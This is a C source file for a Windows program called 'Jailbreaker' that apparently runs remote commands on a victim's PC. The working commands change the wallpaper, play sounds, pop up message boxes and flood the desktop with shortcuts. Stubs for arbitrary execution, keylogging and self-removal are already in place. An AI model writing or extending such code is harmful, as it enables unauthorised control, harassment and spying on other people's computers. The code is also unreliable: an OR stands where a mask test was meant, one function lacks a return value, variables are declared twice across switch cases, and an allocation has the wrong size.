#include "Funnies.h"
#include "Link.h"

WINBOOL changeWallpaper(char *path) {
    return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
}

/*
Use DMDO_X macro or number between 0 - 3 (inclusive)
    Default - 0
    90      - 1
    180     - 2
    270     - 3
*/
LONG ChangeRotation(DWORD Orient) {
    DEVMODE mode;

    EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &mode);
    if (mode.dmFields | DM_DISPLAYORIENTATION) // DM_ORIENTATION ?
    {
        mode.dmDisplayOrientation = Orient;
        return ChangeDisplaySettings(&mode, 0);
    }
}

void openLink(const char *url) {
    ShellExecute(NULL, "open", url, NULL, NULL, SW_SHOWNORMAL);
}

const char *PCName;
static char wallpaper[MAX_PATH] = BADPATH;


// TODO: JBlog these to files instead of console
void JBlog(const char* message) {
    printf("%lli - JBlog: \"%s\"\n", time(NULL), message);
}

void JBlogErr(const char *message) {
    printf("%lli - ERROR: \"%s\"\n", time(NULL), message);
}


void execCommand(JBCMD cmd)
{
    // If strings are different then fail.
    if (strcmp(cmd.auth, PCName)) {
        JBlogErr("Auth failed.");
        return;
    }
    
    switch (cmd.cmd)
    {
    /* --- Templates --- */
    case JB_FUN:
        
        break;
    case JB_DEACTIVE:
        JBlog("Jailbreaker deactivated.");
        exit(0);
        break;
    case JB_REMOVE:
        // you should uninstall yourself NOW!!!
        break;

    /* --- Sounds --- */
    case JB_VOLUME:
        waveOutSetVolume(NULL, atoi(cmd.args)); // deprecated
        break;
    case JB_SZAMBO:
        // path up to change
        PlaySound(cmd.args, NULL, SND_FILENAME | SND_ASYNC);
        break;

    /* --- Wallpaper --- */
    case JB_SETWALL:
        changeWallpaper(cmd.args);
        break;
    case JB_SAVEWALL:
        memcpy(wallpaper, cmd.args, CMD_ARGSZ > MAX_PATH ? MAX_PATH : CMD_ARGSZ);   // Use the smaller value, 256 > 260 then use 256, 512 > 260 then use 260
        break;
    case JB_LOADWALL:
        if (!strcmp(wallpaper, BADPATH)) {
            JBlogErr("No saved wallpaper");
            break;
        }
        
        changeWallpaper(wallpaper);
        break;

    /* --- Shortcuts --- */
    case JB_CREATELINKS:
        char *arg1 = strtok(cmd.args, SEP);
        if(!arg1) {
            JBlogErr("Not enougth arguments");
            break;
        }

        char *arg2 = strtok(NULL, SEP);
        if(!arg2)
            arg2 = "100"; // default 100 icons

        CreateLinks(arg1, atoi(arg2));

        break;
    case JB_REMOVELINKS:

        break;

    /* --- Other --- */
    case JB_OPENWEB:

        break;
    case JB_CDEJECT:

        break;
    
    /*
    case JB_POPUPW:
        //wchar_t wideBuffer[CMD_ARGSZ * 2];
        //MultiByteToWideChar(CP_ACP, MB_COMPOSITE, cmd.args, CMD_ARGSZ, wideBuffer, CMD_ARGSZ * 2)
        char *arg1 = strtok(cmd.args, SEP);
        if(!arg1) {
            JBlogErr("Not enought arguments");
            break;
        }

        int len = MultiByteToWideChar(CP_ACP, 0, arg1, -1, NULL, 0);

        wchar_t *msg = malloc(sizeof(len));
        MultiByteToWideChar(CP_ACP, MB_COMPOSITE, arg1, -1, msg, len);

        char *arg2 = strtok(NULL, SEP);

        if(!arg2)
            wTitle = L"JB";

        MessageBoxW(NULL, msg, wTitle, 0);

        free(msg);
        break;
    */
    case JB_POPUPA:
        char *arg1 = strtok(cmd.args, SEP);
        if(!arg1) {
            JBlogErr("Not enougth arguments");
            break;
        }

        char *arg2 = strtok(NULL, SEP);
        if(!arg2)
            arg2 = "JB"; // default message title

        MessageBoxA(NULL, arg1, arg2, 0);
        break;
    case JB_EXEC:

        break;
    case JB_ROTATESCR:

        break;
    case JB_CHANGERES:

        break;
    case JB_LOGKEYS:

        break;

    default:
        JBlogErr("Unknown command");
        break;
    }
}